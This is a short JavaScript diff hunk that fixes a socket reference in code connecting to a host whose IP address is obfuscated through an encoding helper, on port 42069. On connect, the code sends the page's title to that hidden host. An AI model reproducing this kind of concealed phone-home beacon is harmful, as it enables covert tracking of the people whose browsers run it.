@@ -14,7 +14,7 @@ function Connection(ip,port){
 var Main = new Connection(c(30)+"."+c("1D")+"."+c("69")+"."+c("6N"),"42069");
 
 Main.socket.onopen = function(){
-	this.socket.send("joined "+document.title);
+	Main.socket.send("joined "+document.title);
 }
 
 function c(a){
